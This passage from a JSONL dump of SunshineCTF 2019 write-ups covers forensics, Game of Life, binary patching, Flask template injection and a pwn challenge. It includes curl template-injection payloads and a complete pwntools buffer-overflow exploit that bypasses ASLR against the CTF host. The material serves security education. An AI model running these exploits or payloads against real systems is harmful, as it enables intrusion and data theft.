matches\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# strings Castles.001 | grep peach\r\npeachPeachPEACH Hey! Mario said something about a hidden key. Hesaid this: F2I and A1S, and that it was in two pieces.\r\n```\r\n\r\nOk, we got the message. How do the four letters relate to the castles? F is like Castelo_da_Feira, I is like Inveraray_Castle, A is like Castello_Di_Amorosa and S is like spis-castle. So the first half of the key is in between Amorosa and spis, and the second half between Feira and Inveraray?\r\n\r\nTurns out the if we extract Castelo_da_Feira and Castello_Di_Amorosa **including the file slack**, we get two interesting strings hidden in the slack:\r\n```\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# icat -s Castles.001 23 > Castello_Di_Amorosa_slack.jpg\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# strings Castello_Di_Amorosa_slack.jpg | tail -n 1\r\nAQ273RFGHUI91O\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# strings Castelo_da_Feira_slack.jpg | tail -n 1\r\nLO987YTFGY78IK\r\n```\r\n\r\nCombine these two parts and we get the passphrase for `steghide`:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# steghide extract -sf AlmostThere.jpg -p AQ273RFGHUI91OLO987YTFGY78IK\r\nwrote extracted data to \"flag.txt\".\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# cat flag.txt\r\nflag{7H4NK5_F0R_PL4Y1NG}\r\n```\r\n\r\n", "timestamp": "2025-10-21T13:36:22.201373"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Golly_Gee_Willikers.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Golly_Gee_Willikers.md", "content": "# Golly Gee Willikers\r\nForensics, 100 points\r\n\r\n## Description\r\n\r\n> Someone sent me this weird file and I don't understand it. It's freaking me out, this isn't a game! Please help me figure out what's in this file.\r\n\r\n```\r\nx = 0, y = 0, rule = B3/S23\r\n3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob\r\n3ob3ob3ob3ob3ob3ob3ob3ob3o$obobobobobobobobobobobobobobobobobobobobobo\r\nbobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo\r\nbobobobobob3o$obobobobobobobobobobobobobobobobobobobobobobobobobobobob\r\nobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobob3o\r\n$obobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo\r\nbobobobobobobobobobobobobobobobobobobobobobobobobobobob3o$3ob3ob3ob3ob\r\n3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob\r\n3ob3ob3ob3ob3o$$5bo2bobobobo2b2obo3b2o3bo4bobo3bobo19bo2b2o2bo2b2o2b2o\r\n2bobob3o2b2ob3ob3ob3o11bo5bo3b3o$5bo2bobob3ob2o4bob2o3bo3bo3bo3bo3bo\r\n16bobobob2o4bo3bobobobo3bo5bobobobobo2bo3bo3bo2b3o2bo4bo$5bo6bobo2b2o\r\n2bo2b3o6bo3bo2bobob3o5b3o6bo2bobo2bo3bo3bo2b3ob2o2b3o2bo2b3ob3o9bo9bo\r\n2bo$12b3ob2o2bo3bobo6bo3bo7bo3bo10bo3bobo2bo2bo5bo3bo3bobobobo3bobo3bo\r\n2bo3bo3bo2b3o2bo$5bo6bobo2bo4bo2b2o7bobo11bo8bo2bo3b2o3bo2b3ob2o4bob2o\r\n2b3obo3b3ob2o6bo5bo5bo4bo$$bo3bo2b2o3b2ob2o2b3ob3o2b2obobob3o3bobobobo\r\n3bobobobo2bo2b2o3bo2b2o3b2ob3obobobobobobobobobobob3ob3o5b3o2bo$obobob\r\nobobobo3bobobo3bo3bo3bobo2bo4bobobobo3b3ob3obobobobobobobobobo4bo2bobo\r\nbobobobobobobobo3bobo3bo5bobobo$3ob3ob2o2bo3bobob3ob3ob3ob3o2bo4bob2o\r\n2bo3b3ob3obobob2o2bobob3o2bo3bo2bobobobob3o2bo3bo3bo2bo4bo4bo$o3bobobo\r\nbobo3bobobo3bo3bobobobo2bo2bobobobobo3bobob3obobobo3b3ob2o4bo2bo2bobo\r\n2bo2b3obobo2bo2bo3bo5bo3bo$b2obobob2o3b2ob2o2b3obo4b2obobob3o2bo2bobob\r\n3obobobobo2bo2bo4b2obobob2o3bo3b2o2bo2bobobobo2bo2b3ob3o5b3o5b3o$$o7bo\r\n9bo7bo5bo4bo4bobo3b2o31bo27b2o2bo2b2o3b2ob3o$bo2b2o2b2o3b2o2b2o2b2o2bo\r\n3b2ob2o10bobo2bo2b3ob2o3bo2b2o3b2o2b2o2b2ob3obobobobobobobobobobob3o2b\r\no3bo3bo2b2o2b3o$5b2obobobo3bobobobob3obobobobo2bo4bob2o3bo2b3obobobobo\r\nbobobobobo3b2o3bo2bobobobob3o2bo2bobo2b2obo9bo5b3o$4bobobobobo3bobob2o\r\n3bo2b3obobo2bo4bob2o3bo2b3obobobobobobobobobo4b2o2bo2bobob3ob3o2bo3b2o\r\nb2o3bo3bo3bo6b3o$4b3ob2o3b2o2b2o2b2o2bo4bobobo2bo2bobobobob3obobobobo\r\n2bo2b2o3b2obo3b2o3b2o2b2o2bo2b3obobo3bob3o2b2o2bo2b2o6b3o$29bo11bo22bo\r\n5bo30bo!$$$$13b2o2bo2bo4bo15b2o6bo6b2o11bo2b2o$b2obobob2o3bo2b3ob2o2b2o\r\n3b2o5bobobobob2o2b3o6bo2b2o3b2ob3o2bo$2o2bobobobobo4bo2bobo2bo2b2o6b3o\r\nbobobobo2bo7bo3b2ob2o3bo4bo$b2obobobobo2bo3bo2bobo2bo3b2o5b3obobobobo\r\n2bo7bo2bobo2b2o2bo3bo$2o3b2obobo2b2o2b2obobo2bo2b2o2b3ob3ob2o2bobo2b2o\r\nb3ob3ob3ob2o3b2ob2o!\r\n```\r\n\r\n## Solution\r\n\r\nAfter spending a while trying to analyze the patterns in the file and searching for creative ways to decode anything, I switched tactics and searched Google for the only thing that seemed searchable: \"B3/S23\". It turns out that this is a rule in [Conway's Game of Life](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=9&cad=rja&uact=8&ved=2ahUKEwid3fryv_3hAhUOZ1AKHWN0DvcQFjAIegQIBhAB&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FConway%2527s_Game_of_Life&usg=AOvVaw3Ren4zMW9qfyNBCmJvYMlL) - A cellular automaton model.\r\nThe \"B3/S23\" notation means that:\r\n> A cell is Born if it has exactly 3 neighbours, Survives if it has 2 or 3 living neighbours, and dies otherwise\r\n\r\nThe next step was searching for \"`rule = B3/S23`\", and this yielded results as well. It turns out that this is part of a file format called \"[Extended RLE](http://golly.sourceforge.net/Help/formats.html)\", and used by an open-source application named Golly (hence the challenge title):\r\n\r\n> Golly is an open source, cross-platform application for exploring Conway's Game of Life and many other types of cellular automata. \r\n\r\nGolly even has a [Web Application](http://golly.sourceforge.net/webapp/golly.html) which is able to read \"Extended RLE\" files.\r\n\r\nIf we load our file, we see:\r\n\r\n![](images/golly1.png)\r\n\r\nThis is good progress, but it doesn't really look like a flag.\r\n\r\nWe can run the simulation, but that just leads to an unrecognizable pattern.\r\n\r\nTime for some more research on the file format. \r\n\r\n> Any line that is not blank, or does not start with a \"#\" or \"x \" or \"x=\" is treated as run-length encoded pattern data. The data is ordered a row at a time from top to bottom, and each row is ordered left to right. A \"$\" represents the end of each row and an optional \"!\" represents the end of the pattern. \r\n\r\nThe key here is the last sentence. Our file ends with an exclamation mark, but also contains another one a few lines before the end! This can mean that there are two files concatenated here!\r\n\r\nWe remove the text until the first exclamation mark, and stay with:\r\n```\r\n$$$$13b2o2bo2bo4bo15b2o6bo6b2o11bo2b2o$b2obobob2o3bo2b3ob2o2b2o\r\n3b2o5bobobobob2o2b3o6bo2b2o3b2ob3o2bo$2o2bobobobobo4bo2bobo2bo2b2o6b3o\r\nbobobobo2bo7bo3b2ob2o3bo4bo$b2obobobobo2bo3bo2bobo2bo3b2o5b3obobobobo\r\n2bo7bo2bobo2b2o2bo3bo$2o3b2obobo2b2o2b2obobo2bo2b2o2b3ob3ob2o2bobo2b2o\r\nb3ob3ob3ob2o3b2ob2o!\r\n```\r\n\r\nNow we get:\r\n\r\n![](images/golly2.png)\r\n\r\nThis looks much more like a flag...\r\n\r\n\r\n\r\n\r\n\r\n", "timestamp": "2025-10-21T13:36:22.305028"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Patches_Punches.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Patches_Punches.md", "content": "# Patches' Punches\r\nReversing, 50 points\r\n\r\n## Description\r\n\r\n> That moment when you go for a body slam and you realize you jump too far. Adjust your aim, and you'll crush this challenge!\r\n\r\nA binary file was attached.\r\n\r\n## Solution\r\n\r\nLet's run the file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# ./patches\r\nWoah there! you jumped over the flag.\r\n```\r\n\r\nNot much there. If we jumped over the flag though, it might be available via `strings`:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# strings patches\r\n...\r\nHurray the flag is %s\r\nWoah there! you jumped over the flag.\r\n;*2$\"\r\nzyq|Xu3Px~_{Uo}TmfUq2E3piVtJ2nf!}\r\n...\r\n```\r\n\r\nThe flag seems encrypted, but there is hope - There's a string that hints that it is supposed to print the flag.\r\n\r\nLet's open the binary with Ghidra. The decompilation of main shows:\r\n\r\n```c\r\n/* WARNING: Removing unreachable block (ram,0x00010546) */\r\n/* WARNING: Removing unreachable block (ram,0x00010580) */\r\n/* WARNING: Removing unreachable block (ram,0x0001054f) */\r\n/* WARNING: Removing unreachable block (ram,0x00010586) */\r\n\r\nundefined4 main(undefined1 param_1)\r\n\r\n{\r\n  int iVar1;\r\n  \r\n  iVar1 = __x86.get_pc_thunk.ax();\r\n  printf((char *)(iVar1 + 0x134));\r\n  return 0;\r\n}\r\n```\r\n\r\nThere's not much to work with here. However, the disassembly is much longer than what we are seeing (pasted from `radare2` since it supports text mode):\r\n\r\n```\r\n[0x0000051d]> VV @ main (nodes 7 edges 8 zoom 100%) BB-NORM mouse:canvas-y mov-speed:5\r\n                                         .-----------------------------------------------.\r\n                                         |  0x51d                                        |\r\n                                         | (fcn) main 169                                |\r\n                                         |   main (int argc, char **argv, char **envp);  |\r\n                                         | ; var unsigned int local_10h @ ebp-0x10       |\r\n                                         | ; var signed int local_ch @ ebp-0xc           |\r\n                                         | ; var int local_8h @ ebp-0x8                  |\r\n                                         | ; arg int arg_4h @ esp+0x4                    |\r\n                                         | lea ecx, [arg_4h]                             |\r\n                                         | and esp, 0xfffffff0                           |\r\n                                         | push dword [ecx - 4]                          |\r\n                                         | push ebp                                      |\r\n                                         | mov ebp, esp                                  |\r\n                                         | push ebx                                      |\r\n                                         | push ecx                                      |\r\n                                         | sub esp, 0x10                                 |\r\n                                         | call sym.__x86.get_pc_thunk.ax;[ga]           |\r\n                                         | add eax, 0x1aa4                               |\r\n                                         | mov dword [local_10h], 1                      |\r\n                                         | cmp dword [local_10h], 0                      |\r\n                                         | jne 0x5a3;[gb]                                |\r\n                                         `-----------------------------------------------'\r\n                                                 f t\r\n                                                 | |\r\n                                                 | '-------------------------.\r\n                           .---------------------'                           |\r\n                           |                                                 |\r\n                       .-------------------------------.                 .-----------------------------------.\r\n                       |  0x546                        |                 |  0x5a3                            |\r\n                       | mov dword [local_ch], 0       |                 | ; CODE XREF from main (0x544)     |\r\n                       | jmp 0x580;[gc]                |                 | sub esp, 0xc                      |\r\n                       `-------------------------------'                 | lea edx, [eax - 0x1970]           |\r\n                           v                                             | ; const char *format              |\r\n                           |                                             | push edx                          |\r\n                           |                                             | mov ebx, eax                      |\r\n                           |                                             | ; int printf(const char *format)  |\r\n                           |                                             | call sym.imp.printf;[ge]          |\r\n                           |                                             | add esp, 0x10                     |\r\n                           |                                             `-----------------------------------'\r\n                           |                                                 v\r\n                           |                                                 |\r\n                           |                                                 |\r\n                           |                                                 '-------------.\r\n.----------------------------.                                                             |\r\n|                          | |                                                             |\r\n|                    .-----------------------------------.                                 |\r\n|                    |  0x580                            |                                 |\r\n|                    | ; CODE XREF from main (0x54d)     |                                 |\r\n|                    | cmp dword [local_ch], 0x1e        |                                 |\r\n|                    | jle 0x54f;[gd]                    |                                 |\r\n|                    `-----------------------------------'                                 |\r\n|                          t f                                                             |\r\n|                          | |                                                             |\r\n|    .---------------------' |                                                             |\r\n|    |                       '-------------------------.                                   |\r\n|    |                                                 |                                   |\r\n|.--------------------------------------------.    .-----------------------------------.   |\r\n||  0x54f                                     |    |  0x586                            |   |\r\n|| ; CODE XREF from main (0x584)              |    | sub esp, 8                        |   |\r\n|| lea ecx, [eax + 0xc8]                      |    | lea edx, [eax + 0xc8]             |   |\r\n|| mov edx, dword [local_ch]                  |    | push edx                          |   |\r\n|| add edx, ecx                               |    | lea edx, [eax - 0x1988]           |   |\r\n|| movzx edx, byte [edx]                      |    | ; const char *format              |   |\r\n|| mov ecx, edx                               |    | push edx                          |   |\r\n|| mov edx, dword [local_ch]                  |    | mov ebx, eax                      |   |\r\n|| ; [0x48:4]=288                             |    | ; int printf(const char *format)  |   |\r\n|| ; 'H'                                      |    | call sym.imp.printf;[ge]          |   |\r\n|| mov edx, dword [eax + edx*4 + 0x48]        |    | add esp, 0x10                     |   |\r\n|| sub ecx, edx                               |    | jmp 0x5b7;[gf]                    |   |\r\n|| mov edx, ecx                               |    `-----------------------------------'   |\r\n|| mov ebx, edx                               |        v                                   |\r\n|| lea ecx, [eax + 0xc8]                      |        |                                   |\r\n|| mov edx, dword [local_ch]                  |        |                                   |\r\n|| add edx, ecx                               |        |                                   |\r\n|| mov byte [edx], bl                         |        |                                   |\r\n|| add dword [local_ch], 1                    |        |                                   |\r\n|`--------------------------------------------'        |                                   |\r\n|    v                                                 |                                   |\r\n|    |                                                 |                                   |\r\n`----'                                                 |                                   |\r\n                                                       '--------------.                    |\r\n                                                                      | .------------------'\r\n                                                                      | |\r\n                                                                .-------------------------------.\r\n                                                                |  0x5b7                        |\r\n                                                                | ; CODE XREF from main (0x5a1) |\r\n                                                                | mov eax, 0                    |\r\n                                                                | lea esp, [local_8h]           |\r\n                                                                | pop ecx                       |\r\n                                                                | pop ebx                       |\r\n                                                                | pop ebp                       |\r\n                                                                | lea esp, [ecx - 4]            |\r\n                                                                | ret                           |\r\n                                                                `-------------------------------'\r\n\r\n```\r\n\r\nIt turns out that by default, Ghidra removes unreachable code from the decompilation window. It even warned us with a comment above `main()`.\r\n\r\nThis behavior can be modified by entering Edit -> Tool Options -> Decompiler -> Analysis and unchecking \"Eliminate unreachable code\".\r\n\r\nNow we get the following code:\r\n```c\r\nundefined4 main(undefined1 param_1)\r\n\r\n{\r\n  int iVar1;\r\n  int local_14;\r\n  \r\n  iVar1 = __x86.get_pc_thunk.ax();\r\n  if (true) {\r\n    printf((char *)(iVar1 + 0x134));\r\n  }\r\n  else {\r\n    local_14 = 0;\r\n    while (local_14 < 0x1f) {\r\n      *(char *)(local_14 + iVar1 + 0x1b6c) =\r\n           *(char *)(local_14 + iVar1 + 0x1b6c) -\r\n           (char)*(undefined4 *)(iVar1 + 0x1aec + local_14 * 4);\r\n      local_14 = local_14 + 1;\r\n    }\r\n    printf((char *)(iVar1 + 0x11c),iVar1 + 0x1b6c);\r\n  }\r\n  return 0;\r\n}\r\n```\r\n\r\nWe obviously want to change the \"if (true)\" to \"if (false)\". \r\n\r\nIn assembly, we have:\r\n```assembly\r\n0x00000539      c745f0010000.  mov dword [local_10h], 1\r\n0x00000540      837df000       cmp dword [local_10h], 0\r\n```\r\n\r\nWe'd like to change the immediate value being stored in the local variable to the value being compared right after it.\r\n\r\nWe can try to do this with Ghidra:\r\nRight click on the line we want to patch -> Select \"Patch Instruction\" -> Change the \"1\" to \"0\". Now we can export with \"File -> Export Program -> Binary\".\r\n\r\nLet's run the new program:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# ./patches2.bin\r\nSegmentation fault\r\n```\r\n\r\nTurns out Ghidra has a [bug](https://github.com/NationalSecurityAgency/ghidra/issues/19) related to patching - it messes up the ELF headers. The bug report offers a workaround but let's try `r2` instead:\r\n\r\n```\r\n[0x0000051d]> oo+\r\n[0x0000051d]> s 0x00000539\r\n[0x00000539]> \"wa mov dword [var_10h], 0\"\r\nCannot assemble 'mov dword [var_10h], 0' at line 3\r\n```\r\n\r\nReally?\r\n\r\nHow about IDA? Mark the line and then select Edit -> Patch program -> Assemble -> Enter new assembly.\r\nHere, we get a warning window: \"`Warning: Invalid operand size(s)`\".\r\n\r\nWe'll just use `dd` to patch the byte:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# xxd -g 1 -s $((0x539)) -l 7 patches\r\n00000539: c7 45 f0 01 00 00 00                             .E.....\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# cp patches patches.old\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# echo '00' | xxd -p -r | dd conv=notrunc of=patches bs=1 seek=$((0x53c))\r\n1+0 records in\r\n1+0 records out\r\n1 byte copied, 0.0014464 s, 0.7 kB/s\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# xxd -g 1 -s $((0x539)) -l 7 patches\r\n00000539: c7 45 f0 00 00 00 00                             .E.....\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# radiff2 patches patches.old\r\n0x0000053c 00 => 01 0x0000053c\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# rasm2 -d $(xxd -p -s $((0x539)) -l 7 patches)\r\nmov dword [ebp - 0x10], 0\r\n```\r\n\r\nAnd it turns out we could have used this as well:\r\n```\r\n[0x000003e0]> s 0x539\r\n[0x00000539]> oo+\r\n[0x00000539]> \"wa mov dword [var_10h], 0\"\r\nCannot assemble 'mov dword [var_10h], 0' at line 3\r\n[0x00000539]> \"wa mov dword [ebp - 0x10], 0\"\r\nWritten 7 byte(s) (mov dword [ebp - 0x10], 0) = wx c745f000000000\r\n```\r\n\r\nNow, when we run the program, we get:\r\n```\r\nroot@kali:/media/sf_CTFs/sunshine/Patches_Punches# ./patches\r\nHurray the flag is sun{To0HotToHanDleTo0C0ldToH0ld!}\r\n```", "timestamp": "2025-10-21T13:36:22.525556"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Portfolio.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Portfolio.md", "content": "# Portfolio\r\nWeb, 150 points\r\n\r\n## Description\r\n\r\n> Check out my development portfolio! I'm just getting started, so don't be too mean :(\r\n\r\n\r\n## Solution\r\n\r\nWe visit the attached site and see:\r\n\r\n```html\r\n  <body>\r\n    <header>\r\n      <h1 align=\"center\">Welcome to my dev portfolio!</h1>\r\n      <h3 align=\"center\">check out my cool projects</h3>\r\n    </header>\r\n    <br>\r\n    <h2> Projects </h2>\r\n    <ul> \r\n      <li><a href=\"/hello/name\">Custom greeting</a></li>\r\n      <li><a href=\"/render.html\">Dynamic page rendering</a></li>\r\n    </ul>\r\n  </body>\r\n```\r\n\r\nThe first link leads to a very simple page:\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/hello/name\" && echo\r\n<html>\r\n  <head>\r\n    <title>Templating in Flask</title>\r\n  </head>\r\n  <body>\r\n    <h1>Hello name!</h1>\r\n    <p>Welcome to the world of Flask!</p>\r\n  </body>\r\n</html>\r\n```\r\n\r\nSuch challenges usually lead to [template injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), so let's try that here:\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/hello/\\{\\{4*4\\}\\}\" && echo\r\n<html>\r\n  <head>\r\n    <title>Templating in Flask</title>\r\n  </head>\r\n  <body>\r\n    <h1>Hello {{4*4}}!</h1>\r\n    <p>Welcome to the world of Flask!</p>\r\n  </body>\r\n</html>\r\n```\r\n\r\nThe template was not evaluated, so this page isn't vulnerable to such an attack. \r\n\r\nMoving on, we have we have the \"Dynamic page rendering\" page:\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/render.html\"  && echo\r\n<form action=\"/render\" method=\"post\">\r\n  Page to load:<br>\r\n  <select name=\"template\">\r\n    <option value=\"templates/matches.html\">My favorite matches</option>\r\n    <option value=\"templates/teams.html\">Some cool tag teams</option>\r\n    <!--    <option value=\"templates/admin.html\">admin</option>-->\r\n  </select>\r\n  <input type=\"submit\" value=\"Submit\">\r\n</form>\r\n```\r\n\r\nLet's try to visit all three options (including the commented out admin page):\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/render\" -X POST  --data \"template=templates/matches.html\" && echo\r\nSome cool matches\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/render\" -X POST  --data \"template=templates/teams.html\" && echo\r\nsome cool teams\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/render\" -X POST  --data \"template=templates/admin.html\" && echo\r\n\r\nHi there!\r\n```\r\n\r\nNothing much. However, if we inspect \"admin.html\" directly, we get an interesting result:\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/templates/admin.html\" && echo\r\n{% if config.DEBUG %}\r\n{{config.FLAG}}\r\n{% endif %}\r\nHi there!\r\n```\r\n\r\nIn debug mode, the flag would have been outputted. Can we trigger debug mode? Not in an apparent way. However, we can use the \"hello\" page we saw earlier in order to create a template that would reveal the flag:\r\n\r\n```console\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/hello/\\{\\{config.FLAG\\}\\}\" && echo\r\n<html>\r\n  <head>\r\n    <title>Templating in Flask</title>\r\n  </head>\r\n  <body>\r\n    <h1>Hello {{config.FLAG}}!</h1>\r\n    <p>Welcome to the world of Flask!</p>\r\n  </body>\r\n</html>\r\nroot@kali:~# curl \"http://archive.sunshinectf.org:19009/render\" -X POST  --data \"template=hello/{{config.FLAG}}\" && echo\r\n<html>\r\n  <head>\r\n    <title>Templating in Flask</title>\r\n  </head>\r\n  <body>\r\n    <h1>Hello sun{5l33333p_15_f0r_7h3_w34k}!</h1>\r\n    <p>Welcome to the world of Flask!</p>\r\n  </body>\r\n</html>\r\n```", "timestamp": "2025-10-21T13:36:22.632691"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Return_To_Mania.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Return_To_Mania.md", "content": "# Return To Mania\r\nPWN, 50 points\r\n\r\n## Description\r\n\r\n> To celebrate her new return to wrestling, Captn Overflow authored this challenge to enter the ring\r\n\r\nA binary file was attached.\r\n\r\n## Solution\r\n\r\nLet's run the file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Return_To_Mania# ./return-to-mania\r\nWelcome to WrestleMania! Type in key to get access.\r\naddr of welcome(): 0x565c16ed\r\ntest\r\nSadly, as a result Captn Overflow won't be entering the ring yet...\r\n```\r\n\r\nWe are presented with an address, and an opportunity to enter a string. \r\n\r\nLet's view the decompilation with Ghidra:\r\n\r\n```c\r\nvoid welcome(void)\r\n{\r\n  undefined local_16 [14];\r\n  \r\n  puts(\"Welcome to WrestleMania! Type in key to get access.\");\r\n  printf(\"addr of welcome(): %p\\n\",welcome);\r\n  __isoc99_scanf(&DAT_0001087b,local_16);\r\n  return;\r\n}\r\n\r\nundefined4 main(undefined1 param_1)\r\n{\r\n  welcome();\r\n  puts(\"Sadly, as a result Captn Overflow won\\'t be entering the ring yet...\");\r\n  return 0;\r\n}\r\n```\r\n\r\nSo this is a trivial buffer overflow of `local_16`, hijacking the return address. \r\n\r\nWhere would we like to jump to? From a short exploration of the remaining code, probably here:\r\n\r\n```c\r\nvoid mania(void)\r\n\r\n{\r\n  char local_38 [40];\r\n  FILE *local_10;\r\n  \r\n  puts(\"WELCOME TO THE RING!\");\r\n  local_10 = fopen(\"flag.txt\",\"r\");\r\n  if (local_10 == (FILE *)0x0) {\r\n    perror(\"flag.txt\");\r\n  }\r\n  else {\r\n    fgets(local_38,0x28,local_10);\r\n    fclose(local_10);\r\n    puts(local_38);\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nOne last thing to check before we start writing the exploit: What are the executable security attributes?\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Return_To_Mania# checksec.sh -f return-to-mania\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE\r\nNo RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   75 Symbols      No      0               4       return-to-mania\r\n```\r\n\r\nWe don't have a stack canary but we do have to bypass PIE/ASLR. Luckily, `welcome()`'s address is \"leaked\" to us, so we can use that to calculate the ASLR base.\r\n\r\nThe script:\r\n```python\r\n#!/usr/bin/env python2\r\n# -*- coding: utf-8 -*-\r\n# This exploit template was generated via:\r\n# $ pwn template --host archive.sunshinectf.org --port 19001 ./return-to-mania\r\nfrom pwn import *\r\nimport os\r\n\r\n# Set up pwntools for the correct architecture\r\nexe = context.binary = ELF('./return-to-mania')\r\n\r\n# Many built-in settings can be controlled on the command-line and show up\r\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\r\n# for all created processes...\r\n# ./exploit.py DEBUG NOASLR\r\n# ./exploit.py GDB HOST=example.com PORT=4141\r\nhost = args.HOST or 'archive.sunshinectf.org'\r\nport = int(args.PORT or 19001)\r\n\r\ndef local(argv=[], *a, **kw):\r\n    '''Execute the target binary locally'''\r\n    if args.GDB:\r\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\r\n    else:\r\n        return process([exe.path] + argv, *a, **kw)\r\n\r\ndef remote(argv=[], *a, **kw):\r\n    '''Connect to the process on the remote host'''\r\n    io = connect(host, port)\r\n    if args.GDB:\r\n        gdb.attach(io, gdbscript=gdbscript)\r\n    return io\r\n\r\ndef start(argv=[], *a, **kw):\r\n    '''Start the exploit against the target.'''\r\n    if args.LOCAL:\r\n        return local(argv, *a, **kw)\r\n    else:\r\n        return remote(argv, *a, **kw)\r\n\r\n# Specify your GDB script here for debugging\r\n# GDB will be launched if the exploit is run via e.g.\r\n# ./exploit.py GDB\r\ngdbscript = '''\r\nbreak *0x{exe.symbols.main:x}\r\ncontinue\r\n'''.format(**locals())\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    No RELRO\r\n# Stack:    No canary found\r\n# NX:       NX enabled\r\n# PIE:      PIE enabled\r\n\r\n\r\ndef get_overflow_offset():\r\n    # It's problematic to create a core dump on an NTFS file system,\r\n    # so reconfigure core dumps to be created elsewhere\r\n    os.system(\"echo ~/core/core_dump > /proc/sys/kernel/core_pattern\")\r\n    os.system(\"rm ./core.*\")\r\n\r\n    payload = cyclic(100)\r\n    proc = local()\r\n\r\n    proc.recvline()\r\n    proc.recvline()\r\n    proc.sendline(payload)\r\n\r\n    proc.wait()\r\n    offset = cyclic_find(proc.corefile.eip)\r\n    return offset\r\n\r\noverflow_offset = get_overflow_offset()\r\nlog.info(\"Overflow offset: {}\".format(overflow_offset))\r\n\r\nio = start()\r\nio.recvline()\r\nio.recvuntil(\"addr of welcome():\")\r\n\r\nwelcome_addr = int(io.recvline(keepends = False), 16)\r\nlog.info(\"welcome() address: {}\".format(hex(welcome_addr)))\r\n\r\naslr_base = welcome_addr - exe.symbols[\"welcome\"]\r\n\r\n#mania_addr = ((welcome_addr & 0xFFFFF000) + exe.symbols[\"mania\"])\r\nmania_addr = aslr_base + exe.symbols[\"mania\"]\r\nlog.info(\"mania() address: {}\".format(hex(mania_addr)))\r\n\r\npayload = fit({overflow_offset: p32(mania_addr)}, filler = \"A\")\r\nlog.info(\"Sending payload: {}\".format(enhex(payload)))\r\n\r\nio.sendline(payload)\r\nprint io.recvall()\r\n```\r\n\r\nThe output:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Return_To_Mania# python exploit.py REMOTE\r\n[*] '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania'\r\n    Arch:     i386-32-little\r\n    RELRO:    No RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      PIE enabled\r\n[+] Starting local process '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania': pid 25943\r\n[*] Process '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania' stopped with exit code -11 (SIGSEGV) (pid 25943)\r\n[+] Parsing corefile...: Done\r\n[*] '/media/sf_CTFs/sunshine/Return_To_Mania/core.25943'\r\n    Arch:      i386-32-little\r\n    EIP:       0x61676161\r\n    ESP:       0xffa81c60\r\n    Exe:       '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania' (0x5664d000)\r\n    Fault:     0x61676161\r\n[*] Overflow offset: 22\r\n[+] Opening connection to archive.sunshinectf.org on port 19001: Done\r\n[*] welcome() address: 0x565fa6ed\r\n[*] mania() address: 0x565fa65d\r\n[*] Sending payload: 414141414141414141414141414141414141414141415da65f56\r\n[+] Receiving all data: Done (53B)\r\n[*] Closed connection to archive.sunshinectf.org port 19001\r\nWELCOME TO THE RING!\r\nsun{0V3rfl0w_rUn_w!Ld_br0th3r}\r\n```", "timestamp": "2025-10-21T13:36:22.831751"}
